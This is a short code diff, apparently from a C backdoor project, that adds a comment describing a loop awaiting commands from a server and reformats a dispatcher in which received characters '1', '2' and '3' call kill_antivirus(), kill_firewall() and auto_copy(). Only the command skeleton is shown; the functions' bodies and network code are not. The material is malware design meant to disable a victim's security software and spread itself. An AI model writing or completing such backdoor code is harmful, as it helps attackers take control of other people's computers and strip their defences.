@@ -1,3 +1,9 @@
+/* this sequence must to be in the backdoor
+
+ while(true), the char data will check if there's some data been transfered, 
+ if don't, return to routine. 
+ then will expect for commands of server side. */ 
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <sys/socket.h>
@@ -21,15 +27,16 @@ void execute()
              if(data == '1')
              {
                 kill_antivirus();
-            }
-            else if(data == '2')
-            {
+             }
+             else if(data == '2')
+             {
                 kill_firewall();
-            }
-            else if(data == '3')
-            {
-                    auto_copy();    
-            }
+             }
+             else if(data == '3')
+             {
+                auto_copy();    
+             }
+    
     int main()
     
     {
